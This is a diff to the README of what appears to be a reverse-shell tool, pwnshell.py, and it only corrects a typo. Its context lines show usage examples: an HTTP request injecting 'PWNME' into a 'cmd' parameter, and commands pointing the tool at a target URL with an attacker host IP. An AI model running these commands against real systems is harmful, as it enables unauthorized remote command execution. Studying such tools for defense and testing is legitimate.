@@ -40,7 +40,7 @@
 #### Example:
 -Copy from Burp or Network tab
 
--Replace the Vulnerable parmeterm with 'PWNME'
+-Replace the Vulnerable parameter with 'PWNME'
 ```sh
 GET /Vulnerable.php?cmd=PWNME HTTP/1.1
 Host: 127.0.0.1
@@ -62,7 +62,7 @@ Upgrade-Insecure-Requests: 1
 ./pwnshell.py -H <HOST-IP> -u http/s://<TARGET>/Vulnerable.php?cmd=PWNME --method GET --cookie '{"key" : "value"}' 
 ```
 #### Example:
--Replace the Vulnerable parmeterm with 'PWNME'
+-Replace the Vulnerable parameter with 'PWNME'
 ```sh
 
 ./pwnshell.py -H 127.0.0.1 -u http://10.10.10.10/vulnerable.php?cmd=PWNME
